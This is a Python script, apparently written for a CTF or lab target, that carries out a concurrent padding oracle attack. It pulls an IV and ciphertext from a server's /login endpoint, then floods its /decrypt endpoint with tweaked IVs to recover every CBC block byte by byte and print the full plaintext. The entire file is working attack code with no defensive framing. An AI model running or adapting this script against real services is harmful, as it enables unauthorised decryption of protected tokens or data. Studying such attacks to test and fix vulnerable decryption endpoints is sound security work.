"""
Fast async padding oracle attack.
"""
import asyncio, aiohttp, sys, time

CONCURRENCY = 40

async def oracle(session, sem, base, iv_hex, ct_hex):
    async with sem:
        try:
            async with session.post(f"{base}/decrypt", json={"iv": iv_hex, "ciphertext": ct_hex},
                                     timeout=aiohttp.ClientTimeout(total=10)) as r:
                if r.status == 200:
                    data = await r.json()
                    return data.get("ok") is True
        except:
            pass
        return False

async def find_byte(session, sem, base, ct_block_hex, inter, pos):
    pad = 16 - pos
    for batch_start in range(0, 256, CONCURRENCY):
        batch_end = min(batch_start + CONCURRENCY, 256)
        async def try_one(g):
            tweak = bytearray(16)
            for j in range(pos + 1, 16):
                tweak[j] = inter[j] ^ pad
            tweak[pos] = g
            ok = await oracle(session, sem, base, tweak.hex(), ct_block_hex)
            return g, ok
        tasks = [try_one(g) for g in range(batch_start, batch_end)]
        results = await asyncio.gather(*tasks)
        for g, ok in results:
            if ok:
                return g
    return None

async def recover_block(session, sem, base, prev_hex, ct_block_hex, label):
    prev = bytes.fromhex(prev_hex)
    inter = bytearray(16)
    for pos in range(15, -1, -1):
        t0 = time.time()
        found = await find_byte(session, sem, base, ct_block_hex, inter, pos)
        dt = time.time() - t0
        if found is not None:
            inter[pos] = found ^ (16 - pos)
            ch = chr(inter[pos]) if 32 <= inter[pos] < 127 else f"\\x{inter[pos]:02x}"
            print(f"[{label}] pos {pos:2d}: 0x{found:02x} -> {ch} [{16-pos}/16] {dt:.1f}s", flush=True)
        else:
            print(f"[{label}] pos {pos:2d}: NO MATCH [{16-pos}/16] {dt:.1f}s", flush=True)
            inter[pos] = 0
    pt = bytes(a ^ b for a, b in zip(prev, inter))
    print(f"[{label}] hex: {pt.hex()}  str: {pt.decode(errors='replace')}", flush=True)
    return pt

async def main():
    base = sys.argv[1].rstrip("/")
    
    async with aiohttp.ClientSession() as s:
        async with s.get(f"{base}/login") as r:
            d = await r.json()
            iv_hex, ct_hex = d["iv"], d["ciphertext"]
    
    print(f"IV: {iv_hex}\nCT: {ct_hex}", flush=True)
    ct = bytes.fromhex(ct_hex)
    blocks = [ct[i:i+16] for i in range(0, len(ct), 16)]
    print(f"{len(blocks)} blocks\n", flush=True)
    
    sem = asyncio.Semaphore(CONCURRENCY)
    async with aiohttp.ClientSession() as session:
        tasks = []
        for i, block in enumerate(blocks):
            prev = iv_hex if i == 0 else blocks[i-1].hex()
            tasks.append(recover_block(session, sem, base, prev, block.hex(), f"B{i}"))
        results = await asyncio.gather(*tasks)
    
    plaintext = b"".join(results)
    p = plaintext[-1]
    if 1 <= p <= 16 and plaintext[-p:] == bytes([p] * p):
        plaintext = plaintext[:-p]
    
    print(f"\n=== Full ({len(plaintext)} bytes) ===", flush=True)
    print(plaintext.decode(errors='replace'), flush=True)

if __name__ == "__main__":
    asyncio.run(main())
